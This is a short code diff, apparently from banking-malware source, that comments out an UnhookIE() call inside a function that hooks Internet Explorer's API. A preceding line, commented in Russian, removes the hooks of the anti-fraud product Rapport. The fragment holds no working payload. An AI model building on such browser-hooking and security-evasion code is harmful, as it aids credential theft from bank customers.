@@ -1439,7 +1439,7 @@ bool HookInternetExplorerApi() {
 		AntiRapport(); // снимаем хуки антирапорта
 	#endif
 
-	UnhookIE();
+	//UnhookIE();
 
 	IEDBG("Инициализируем глобальные данные");
 	InitIEGlobalData();
